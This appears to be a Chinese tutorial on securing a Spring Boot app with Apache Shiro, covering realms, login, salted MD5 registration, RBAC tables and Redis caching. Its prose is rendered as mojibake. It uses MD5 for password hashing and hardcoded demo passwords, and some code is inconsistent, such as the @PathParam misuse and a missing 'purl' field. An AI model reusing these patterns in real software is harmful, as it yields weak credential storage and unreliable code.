</dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\nå¼å¥shiroæ´åspringboot\n\n<dependency>\n  <groupId>org.apache.shiro</groupId>\n  <artifactId>shiro-spring-boot-starter</artifactId>\n  <version>1.5.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n# 2. éç½®Spring Booté¡¹ç®\n\néç½®Springbootéç½®æä»¶\n\nserver.port=8888\nserver.servlet.context-path=/shiro\nspring.mvc.view.prefix=/\nspring.mvc.view.suffix=.jsp\n\n\n1\n2\n3\n4\n\n\néç½®å·¥ä½ç®å½\n\n\n\n# 3. éç½®shiroç¯å¢\n\n# 0. åå»ºéç½®ç±»\n\npackage com.pwddd.shiro.config;\n\nimport com.pwddd.shiro.realm.CustomerRealm;\nimport org.apache.shiro.realm.Realm;\nimport org.apache.shiro.spring.web.ShiroFilterFactoryBean;\nimport org.apache.shiro.web.mgt.DefaultWebSecurityManager;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n/**\n * ç¨äºæ´åshiroçéç½®ç±»\n */\n@Configuration\npublic class ShiroConfig {\n    //1. åå»ºshiro filter\n    @Bean\n    public ShiroFilterFactoryBean getShiroFilterFactoryBean(DefaultWebSecurityManager defaultWebSecurityManager){\n        ShiroFilterFactoryBean factoryBean = new ShiroFilterFactoryBean();\n        factoryBean.setSecurityManager(defaultWebSecurityManager);\n\n        // éç½®ç³»ç»çåéèµæºåå¬å±èµæº\n        Map<String,String> map = new HashMap<>();\n        map.put("/login.jsp","anon");\n        map.put("/user/login","anon");\n        map.put("/**","authc");\n\n        // é»è®¤çè®¤è¯çé¢ login.jsp\n        factoryBean.setLoginUrl("/login.jsp");\n\n        factoryBean.setFilterChainDefinitionMap(map);\n        return factoryBean;\n\n\n    }\n    //2. åå»ºå®å¨ç®¡çå¨\n    @Bean\n    public DefaultWebSecurityManager defaultWebSecurityManager(AuthorizingRealm realm){\n        DefaultWebSecurityManager defaultWebSecurityManager = new DefaultWebSecurityManager();\n        defaultWebSecurityManager.setRealm(realm);\n        return defaultWebSecurityManager;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n# 1. åå»ºèªå®ä¹realm\n\npackage com.pwddd.shiro.realm;\n\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.AuthenticationInfo;\nimport org.apache.shiro.authc.AuthenticationToken;\nimport org.apache.shiro.authc.SimpleAuthenticationInfo;\nimport org.apache.shiro.authz.AuthorizationInfo;\nimport org.apache.shiro.realm.AuthorizingRealm;\nimport org.apache.shiro.subject.PrincipalCollection;\n\npublic class CustomerRealm extends AuthorizingRealm {\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n        return null;\n    }\n\n    @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n        System.out.println("====================================");\n        String principal = (String) authenticationToken.getPrincipal();\n\n        if ("zhangsan".equals(principal)){\n\n            SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(\n                    principal,\n                    "123456",\n                    this.getName()\n            );\n            return authenticationInfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n# 2. éç½®é¡µé¢è·³è½¬\n\npackage com.pwddd.shiro.controller;\n\nimport org.apache.shiro.SecurityUtils;\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.IncorrectCredentialsException;\nimport org.apache.shiro.authc.UnknownAccountException;\nimport org.apache.shiro.authc.UsernamePasswordToken;\nimport org.apache.shiro.subject.Subject;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\n@RequestMapping("user")\npublic class UserController {\n\n    @PostMapping("login")\n    public String login(String username,String password){\n\n        Subject subject = SecurityUtils.getSubject();\n\n        try {\n            subject.login(new UsernamePasswordToken(username,password));\n            return "redirect:/index.jsp";\n        } catch (UnknownAccountException e) {\n//            e.printStackTrace();\n            System.out.println("ç¨æ·åéè¯¯");\n        } catch (IncorrectCredentialsException e){\n            System.out.println("å¯ç éè¯¯");\n        }\n\n        return "redirect:/login.jsp";\n    }\n    @GetMapping("logout")\n    public String logout(){\n        Subject subject = SecurityUtils.getSubject();\n        subject.logout();\n        return "redirect:/login.jsp";\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\næ³¨æ:\n\né»è®¤å¨éç½®å¥½shiroç¯å¢åé»è®¤ç¯å¢ä¸­æ²¡æå¯¹é¡¹ç®ä¸­ä»»ä½èµæºè¿è¡æéæ§å¶,ææç°å¨é¡¹ç®ä¸­ææèµæºé½å¯ä»¥éè¿è·¯å¾è®¿é®\n\n# 4. å¸¸è§è¿æ»¤å¨\n\næ³¨æ: shiroæä¾åå¤ä¸ªé»è®¤çè¿æ»¤å¨ï¼æä»¬å¯ä»¥ç¨è¿äºè¿æ»¤å¨æ¥éç½®æ§å¶æå®urlçæéï¼\n\néç½®ç¼©å                å¯¹åºçè¿æ»¤å¨                           åè½\nanon                AnonymousFilter                  æå®urlå¯ä»¥å¿åè®¿é®\nauthc               FormAuthenticationFilter         æå®urléè¦formè¡¨åç»å½ï¼é»è®¤ä¼ä»è¯·æ±ä¸­è·åusernameãpassword,rememberMeç­åæ°å¹¶å°è¯ç»å½ï¼å¦æç»å½ä¸äºå°±ä¼è·³è½¬å°loginUrléç½®çè·¯å¾ãæä»¬ä¹å¯ä»¥ç¨è¿ä¸ªè¿æ»¤å¨åé»è®¤çç»å½é»è¾ï¼ä½æ¯ä¸è¬é½æ¯æä»¬èªå·±å¨æ§å¶å¨åç»å½é»è¾çï¼èªå·±åçè¯åºéè¿åçä¿¡æ¯é½å¯ä»¥å®å¶åã\nauthcBasic          BasicHttpAuthenticationFilter    æå®urléè¦basicç»å½\nlogout              LogoutFilter                     ç»åºè¿æ»¤å¨ï¼éç½®æå®urlå°±å¯ä»¥å®ç°éåºåè½ï¼éå¸¸æ¹ä¾¿\nnoSessionCreation   NoSessionCreationFilter          ç¦æ­¢åå»ºä¼è¯\nperms               PermissionsAuthorizationFilter   éè¦æå®æéæè½è®¿é®\nport                PortFilter                       éè¦æå®ç«¯å£æè½è®¿é®\nrest                HttpMethodPermissionFilter       å°httpè¯·æ±æ¹æ³è½¬åæç¸åºçå¨è¯æ¥æé ä¸ä¸ªæéå­ç¬¦ä¸²ï¼è¿ä¸ªæè§æä¹ä¸å¤§ï¼æå´è¶£èªå·±çæºç çæ³¨é\nroles               RolesAuthorizationFilter         éè¦æå®è§è²æè½è®¿é®\nssl                 SslFilter                        éè¦httpsè¯·æ±æè½è®¿é®\nuser                UserFilter                       éè¦å·²ç»å½æâè®°ä½æâçç¨æ·æè½è®¿é®\n\n# 5. è®¤è¯çå®ç°\n\n# 1. login.jspå¼åè®¤è¯çé¢\n\n<%--\n  Created by IntelliJ IDEA.\n  User: plankton\n  Date: 2022/3/28\n  Time: 20:26\n  To change this template use File | Settings | File Templates.\n--%>\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n  <head>\n    <title>ç»å½</title>\n  </head>\n  <body>\n    <h1>ç»å½</h1>\n    <form action="${pageContext.request.contextPath}/user/login" method="post">\n      ç¨æ·åï¼<input type="text" name="username" > <br>\n      å¯ç  ï¼<input type="password" name="password"> <br>\n      <input type="submit" name="æäº¤">\n    </form>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 2. indexé¡µé¢\n\n<%--\n  Created by IntelliJ IDEA.\n  User: plankton\n  Date: 2022/3/28\n  Time: 20:26\n  To change this template use File | Settings | File Templates.\n--%>\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n  <head>\n    <title>é¦é¡µ</title>\n  </head>\n  <body>\n    <h1>é¦é¡µ</h1>\n    <a href="${pageContext.request.contextPath}/user/logout">éåºç»é</a> <br>\n    <ul>\n      <li><a href="#">ç¨æ·ç®¡ç</a></li>\n      <li><a href="#">ååç®¡ç</a></li>\n      <li><a href="#">è®¢åç®¡ç</a></li>\n      <li><a href="#">ç©æµç®¡ç</a></li>\n    </ul>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 7. MD5åsaltè®¤è¯çå®ç°\n\n# 0. å®ç°æ³¨å\n\næ³¨åé¡µé¢ï¼\n\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>æ³¨å</title>\n</head>\n<body>\n<h1>æ³¨å</h1>\n<form action="${pageContext.request.contextPath}/user/register" method="post">\n    ç¨æ·åï¼<input type="text" name="username" > <br>\n    å¯ç  ï¼<input type="password" name="password"> <br>\n    <input type="submit" name="æäº¤">\n</form>\n</body>\n</html>\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 1. å¼å¥æ°æ®åº\n\nç¸å³ä¾èµ\n\n<dependency>\n  <groupId>org.mybatis.spring.boot</groupId>\n  <artifactId>mybatis-spring-boot-starter</artifactId>\n  <version>2.2.2</version>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <version>8.0.28</version>\n</dependency>\n\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>druid</artifactId>\n  <version>1.2.8</version>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\néç½®\n\n# æ°æ®æº\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\nspring.datasource.type=com.alibaba.druid.pool.DruidDataSource\nspring.datasource.url=jdbc:mysql://localhost:3306/shirodemo?characterEncoding=utf8\nspring.datasource.username=root\nspring.datasource.password=123456\n\n\n1\n2\n3\n4\n5\n6\n\n\nåå»ºentity\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport lombok.experimental.Accessors;\n\n@Data\n@Accessors(chain = true)\n@NoArgsConstructor\n@AllArgsConstructor\npublic class User {\n    private String id;\n    private String username;\n    private String password;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nç¼åmapperæä»¶\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE mapper\n        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">\n\x3c!--åç§°ç©ºé´åæ¥è¯¢ä¸­çåç§°ç©ºé´ä¸è´--\x3e\n<mapper namespace="com.pwddd.shirojsp.mapper.UserMapper">\n\n    <insert id="save" parameterType="com.pwddd.shirojsp.entity.User">\n        insert into t_user values(#{id},#{username},#{password})\n    </insert>\n</mapper>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\néç½®mybatis\n\n# mybatis\nmybatis.type-aliases-package=com.pwddd.shirojsp.entity\nmybatis.mapper-locations=classpath:mapper/*.xml\n\n\n1\n2\n3\n\n\nåå»ºserviceå±\n\npackage com.pwddd.shirojsp.service.impl;\n\nimport com.pwddd.shirojsp.entity.User;\nimport com.pwddd.shirojsp.mapper.UserMapper;\nimport com.pwddd.shirojsp.service.UserService;\nimport org.apache.shiro.crypto.hash.Md5Hash;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\nimport java.util.UUID;\n\n@Service("userServiceImpl")\npublic class UserServiceImpl implements UserService {\n\n    @Autowired\n    private UserMapper userMapper;\n\n    @Override\n    public void register(User user) {\n        String uuid = UUID.randomUUID().toString();\n        uuid = uuid.replace("-","");\n        user.setId(uuid);\n        Md5Hash md5Hash = new Md5Hash(user.getPassword(), uuid, 1024);\n        user.setPassword(md5Hash.toHex());\n        userMapper.save(user);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nç¼åcontrollerå±\n\n@PostMapping("register")\npublic String register(User user){\n  userService.register(user);\n  return "redirect:/login.jsp";\n}\n\n\n1\n2\n3\n4\n5\n\n\n# 3. è®¤è¯å®ç°\n\næ°æ®åºæ¥è¯¢ç¨æ·ä¿¡æ¯\n\n @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n        System.out.println("====================================");\n        String principal = (String) authenticationToken.getPrincipal();\n\n        // 1. å©ç¨åå­å»æ¥è¯¢æ°æ®åº\n        User user = userService.getUser(principal);\n        if (user != null){\n            return new SimpleAuthenticationInfo(\n                    user.getUsername(),\n                    user.getPassword(),\n                    ByteSource.Util.bytes(user.getId()),\n                    this.getName()\n            );\n        }\n        return null;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nè®¾ç½®å å¯ç®æ³åæ£åæ¬¡æ°\n\n//2. åå»ºå®å¨ç®¡çå¨\n@Bean\npublic DefaultWebSecurityManager defaultWebSecurityManager(AuthorizingRealm realm){\n  DefaultWebSecurityManager defaultWebSecurityManager = new DefaultWebSecurityManager();\n\n  HashedCredentialsMatcher credentialsMatcher = new HashedCredentialsMatcher();\n  credentialsMatcher.setHashAlgorithmName("MD5");\n  credentialsMatcher.setHashIterations(1024);\n  realm.setCredentialsMatcher(credentialsMatcher);\n\n  defaultWebSecurityManager.setRealm(realm);\n  return defaultWebSecurityManager;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 8. ææçå®ç°\n\n# 0. ææé¡µé¢\n\n<%@ taglib prefix="shiro" uri="http://shiro.apache.org/tags" %>\n<%--\n  Created by IntelliJ IDEA.\n  User: plankton\n  Date: 2022/3/28\n  Time: 20:26\n  To change this template use File | Settings | File Templates.\n--%>\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>é¦é¡µ</title>\n</head>\n<body>\n<h1>é¦é¡µ</h1>\n<a href="${pageContext.request.contextPath}/user/logout">éåºç»é</a> <br>\n<ul>\n    <shiro:hasAnyRoles name="admin" >\n        \n        <shiro:hasAnyRoles name="user">\n            <li><a href="#">ç¨æ·ç®¡ç</a></li>\n        </shiro:hasAnyRoles>\n        \n        <shiro:hasAnyRoles name="order">\n            <li><a href="#">ååç®¡ç</a></li>\n            <li><a href="#">è®¢åç®¡ç</a></li>\n            <li><a href="#">ç©æµç®¡ç</a></li>\n        </shiro:hasAnyRoles>\n        \n    </shiro:hasAnyRoles>\n</ul>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n# 1. æµè¯ä»£ç \n\n@Override\nprotected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n  String principal = (String) principalCollection.getPrimaryPrincipal();\n  if ("admin".equals(principal)){\n    SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();\n    authorizationInfo.addRoles(Arrays.asList("admin","user"));\n    return authorizationInfo;\n  }\n  return null;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 2. æ¹æ³è°ç¨ä¸­çæéæ§å¶\n\n@RequestMapping("delete/{username}")\n@ResponseBody\n@RequiresRoles(value = {"admin","user"})\npublic String deleteUser(@PathParam("username")String username){\n    userService.deleteUser(username);\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 3. æææ°æ®æä¹å\n\néå¸¸æåµä¸ï¼æä»¬çææä¿¡æ¯å­å¨å°æ°æ®åºä¸­ï¼æä»¬è¿éä½¿ç¨ä¸ä¸ªç¨æ·å¯¹åºå¤ä¸ªè§è²ï¼è§è²å¯¹åºæéçRBACæ¨¡åè¿è¡è®¾è®¡ãå¦ä¸å¾æç¤ºï¼\n\n\n\nåå»ºå¯¹åºçè¡¨ï¼\n\ndrop table if exists t_role;\ncreate table if not exists t_role\n(\n    rid   varchar(100) not null,\n    rname varchar(200) not null,\n    primary key (rid)\n);\n\ninsert into t_role\nvalues (\'1\', \'admin\'),\n       (\'2\', \'user\'),\n       (\'3\', \'order\');\n\ndrop table if exists t_permission;\ncreate table if not exists t_permission\n(\n    pid   varchar(100) not null,\n    pname varchar(200) not null,\n    url   varchar(200) not null,\n    primary key (pid)\n);\n\ninsert into t_permission\nvalues (\'1\', \'user:*:*\', \'/user/*\'),\n       (\'2\', \'order:*:*\', \'/order/*\'),\n       (\'3\', \'user:delete:*\', \'/user/delete/\');\n\n\ndrop table if exists t_user_role;\ncreate table if not exists t_user_role\n(\n    id  varchar(100) not null,\n    uid varchar(100) not null,\n    rid varchar(100) not null,\n    primary key (id)\n);\n\ninsert into t_user_role\nvalues (\'1\', \'826975e8649341c1b6af743e4f9923f2\', \'1\'),\n       (\'2\', \'826975e8649341c1b6af743e4f9923f2\', \'2\'), -- admin all\n       (\'3\', \'826975e8649341c1b6af743e4f9923f2\', \'3\'),\n       (\'4\', \'00b6c77cb7c048e9a6a8858a600cc206\', \'3\'); -- lisi order\n\ndrop table if exists t_role_permission;\ncreate table t_role_permission\n(\n    id  varchar(100) not null,\n    rid varchar(100) not null,\n    pid varchar(100) not null,\n    primary key (id)\n);\n\ninsert into t_role_permission\nvalues (\'1\', \'1\', \'1\'),\n       (\'2\', \'1\', \'2\'),\n       (\'3\', \'1\', \'3\'),\n       (\'4\', \'2\', \'1\'),\n       (\'5\', \'2\', \'3\'),\n       (\'6\', \'3\', \'2\'),\n       (\'7\', \'3\', \'2\');\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\nç¼åå®ä½ç±»ï¼\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport lombok.experimental.Accessors;\n\nimport java.util.List;\n\n@Data\n@Accessors(chain = true)\n@NoArgsConstructor\n@AllArgsConstructor\npublic class Role {\n    \n    private String id;\n    private String rid;\n    private String rname;\n    \n    private List<Perm> perms;\n    \n}\n\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport lombok.experimental.Accessors;\n\n@Data\n@Accessors(chain = true)\n@NoArgsConstructor\n@AllArgsConstructor\npublic class Perm {\n\n    private String id;\n    private String pid;\n    private String pname;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\næ¥è¯¢ç¨æ·æ¶å°±æ¥ææçç¨æ·æéåèº«ä»½ä¿¡æ¯ï¼\n\n<resultMap id="usermap" type="User">\n  <id column="id" property="id" />\n  <result column="username" property="username" />\n  <result column="password" property="password" />\n  <collection property="roles" ofType="Role" >\n    <id column="role_id" property="rid" />\n    <result column="role_name" property="rname" />\n    <collection property="perms" ofType="Perm">\n      <id column="perm_id" property="pid" />\n      <result column="perm_name" property="pname" />\n      <result column="perm_url" property="purl" />\n    </collection>\n  </collection>\n</resultMap>\n<select id="selectUser" resultMap="usermap">\n  select u.id, u.username, u.password, r.rid role_id, r.rname role_name,tp.pid perm_id,tp.pname perm_name,tp.url perm_url\n  from t_user u\n  left join t_user_role ur on u.id = ur.uid\n  left join t_role r on ur.rid = r.rid\n  left join t_role_permission trp on r.rid = trp.rid\n  left join t_permission tp on trp.pid = tp.pid\n  where username = #{username}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nè®¾ç½®æéä¿¡æ¯ï¼\n\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n        String principal = (String) principalCollection.getPrimaryPrincipal();\n\n        // æ ¹æ®principalæ¥è¯¢å¯¹åºçç¨æ·ç»\n        User user = userService.getUser(principal);\n        if (user != null){\n            SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();\n            for (Role role :\n                    user.getRoles()) {\n                authorizationInfo.addRole(role.getRname());\n                for (Perm perm : role.getPerms()){\n                    authorizationInfo.addStringPermission(perm.getPname());\n                }\n            }\n            return authorizationInfo;\n        }\n\n        return null;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 9. ä½¿ç¨CacheManager\n\n# 0. Ehcache\n\nå¼å¥ä¾èµ\n\n<dependency>\n  <groupId>org.apache.shiro</groupId>\n  <artifactId>shiro-ehcache</artifactId>\n  <version>1.5.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nå¼å¯ç¼å­\n\n//2. åå»ºå®å¨ç®¡çå¨\n@Bean\npublic DefaultWebSecurityManager defaultWebSecurityManager(AuthorizingRealm realm){\n\n  DefaultWebSecurityManager defaultWebSecurityManager = new DefaultWebSecurityManager();\n\n  HashedCredentialsMatcher credentialsMatcher = new HashedCredentialsMatcher();\n  credentialsMatcher.setHashAlgorithmName("MD5");\n  credentialsMatcher.setHashIterations(1024);\n  realm.setCredentialsMatcher(credentialsMatcher);\n  realm.setCacheManager(new EhCacheManager());\n  realm.setCachingEnabled(true);\n  realm.setAuthorizationCachingEnabled(true);\n  realm.setAuthenticationCachingEnabled(true);\n  defaultWebSecurityManager.setRealm(realm);\n  return defaultWebSecurityManager;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 1. redis\n\nå¼å¥redisä¾èµï¼\n\n\x3c!--redisæ´åspringboot--\x3e\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\néç½®è¿æ¥ï¼\n\n# redis\nspring.redis.database=0\nspring.redis.host=localhost\nspring.redis.port=6379\n\n\n1\n2\n3\n4\n\n\néç½®RedisCacheManager\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.cache.Cache;\nimport org.apache.shiro.cache.CacheException;\nimport org.apache.shiro.cache.CacheManager;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.autoconfigure.cache.CacheProperties;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class RedisCacheManager implements CacheManager {\n\n    @Autowired\n    private RedisCache redisCache;\n\n    @Override\n    public <K, V> Cache<K, V> getCache(String s) throws CacheException {\n        System.out.println(s);\n        redisCache.setCacheName(s);\n        return redisCache;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\néç½®RedisCache\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.cache.Cache;\nimport org.apache.shiro.cache.CacheException;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.stereotype.Component;\n\nimport java.util.Collection;\nimport java.util.Set;\n\n@Component\npublic class RedisCache<K,V> implements Cache<K,V> {\n\n    private String cacheName;\n\n\n    public RedisCache() {\n    }\n\n    public String getCacheName() {\n        return cacheName;\n    }\n\n    public void setCacheName(String cacheName) {\n        this.cacheName = cacheName;\n    }\n\n    @Autowired\n    private RedisTemplate redisTemplate;\n\n    @Override\n    public V get(K k) throws CacheException {\n        V value = (V) redisTemplate.opsForHash().get(this.getCacheName(), k);\n        System.out.println("ãRedis - GETã{ key:"+k+",Value:"+value);\n        return value;\n    }\n\n    @Override\n    public V put(K k, V v) throws CacheException {\n        System.out.println("ãRedis - PUTã{ key:"+k+",Value:"+v);\n        redisTemplate.opsForHash().put(this.cacheName,k.toString(),v);\n        return null;\n    }\n\n    @Override\n    public V remove(K k) throws CacheException {\n        V value = (V) redisTemplate.opsForHash().delete(this.cacheName, k.toString());\n        System.out.println("ãRedis - PUTã{ key:"+k+",Value:"+value);\n        return value;\n    }\n\n    @Override\n    public void clear() throws CacheException {\n        System.out.println("ãRedis - CLEARã{} ");\n        redisTemplate.delete(this.getCacheName());\n    }\n\n    @Override\n    public int size() {\n        return redisTemplate.opsForHash().size(this.cacheName).intValue();\n    }\n\n    @Override\n    public Set<K> keys() {\n        return redisTemplate.opsForHash().keys(this.cacheName);\n    }\n\n    @Override\n    public Collection<V> values() {\n        return redisTemplate.opsForHash().values(this.cacheName);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\néç½®ç¼å­ç®¡çå¨\n\n@Bean\npublic DefaultWebSecurityManager defaultWebSecurityManager(AuthorizingRealm realm,RedisCacheManager redisCacheManager){\n\n  DefaultWebSecurityManager defaultWebSecurityManager = new DefaultWebSecurityManager();\n\n  HashedCredentialsMatcher credentialsMatcher = new HashedCredentialsMatcher();\n  credentialsMatcher.setHashAlgorithmName("MD5");\n  credentialsMatcher.setHashIterations(1024);\n  realm.setCredentialsMatcher(credentialsMatcher);\n  realm.setCacheManager(redisCacheManager);\n  realm.setCachingEnabled(true);\n  realm.setAuthorizationCachingEnabled(true);\n  realm.setAuthenticationCachingEnabled(true);\n  defaultWebSecurityManager.setRealm(realm);\n  return defaultWebSecurityManager;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\næµè¯ä¹åæ¥éï¼å ä¸ºçä¸è½å¤åºååï¼å æ­¤è¿éè¦è§£å³è¿ä¸ªbug\n\nnested exception is java.io.NotSerializableException: org.apache.shiro.util.SimpleByteSource\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.codec.Base64;\nimport org.apache.shiro.codec.CodecSupport;\nimport org.apache.shiro.codec.Hex;\nimport org.apache.shiro.util.ByteSource;\n\nimport java.io.File;\nimport java.io.InputStream;\nimport java.io.Serializable;\nimport java.util.Arrays;\n\npublic class CustomerByteSource implements ByteSource, Serializable {\n\n\n    private static final long serialVersionUID = -6698337076775679951L;\n    private  byte[] bytes;\n    private String cachedHex;\n    private String cachedBase64;\n\n    public CustomerByteSource(byte[] bytes) {\n        this.bytes = bytes;\n    }\n\n    /**\n     * Creates an instance by converting the characters to a byte array (assumes UTF-8 encoding).\n     *\n     * @param chars the source characters to use to create the underlying byte array.\n     * @since 1.1\n     */\n    public CustomerByteSource(char[] chars) {\n        this.bytes = CodecSupport.toBytes(chars);\n    }\n\n    /**\n     * Creates an instance by converting the String to a byte array (assumes UTF-8 encoding).\n     *\n     * @param string the source string to convert to a byte array (assumes UTF-8 encoding).\n     * @since 1.1\n     */\n    public CustomerByteSource(String string) {\n        this.bytes = CodecSupport.toBytes(string);\n    }\n\n    /**\n     * Creates an instance using the sources bytes directly - it does not create a copy of the\n     * argument\'s byte array.\n     *\n     * @param source the source to use to populate the underlying byte array.\n     * @since 1.1\n     */\n    public CustomerByteSource(ByteSource source) {\n        this.bytes = source.getBytes();\n    }\n\n    /**\n     * Creates an instance by converting the file to a byte array.\n     *\n     * @param file the file from which to acquire bytes.\n     * @since 1.1\n     */\n    public CustomerByteSource(File file) {\n        this.bytes = new CustomerByteSource.BytesHelper().getBytes(file);\n    }\n\n    /**\n     * Creates an instance by converting the 